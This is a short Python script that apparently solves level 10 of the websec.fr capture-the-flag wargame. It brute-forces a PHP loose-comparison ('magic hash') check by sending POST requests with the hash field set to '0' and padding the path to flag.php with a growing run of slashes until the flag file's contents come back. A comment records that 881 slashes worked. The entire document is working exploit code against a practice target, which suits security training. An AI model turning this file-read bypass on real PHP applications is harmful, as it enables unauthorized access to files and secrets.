import requests


url = 'http://websec.fr/level10/index.php'
filename = './flag.php'
i = 0

while True:
    print(f"Trying: {filename}")
    r = requests.post(url, data={"f": filename, "hash": "0"})
    # print(r.text)
    
    if "WEBSEC" in r.text:
        print(r.text)
        break
    else:
        i += 1
        filename = '.' + '/' * i + 'flag.php'
        
# Find with i = 881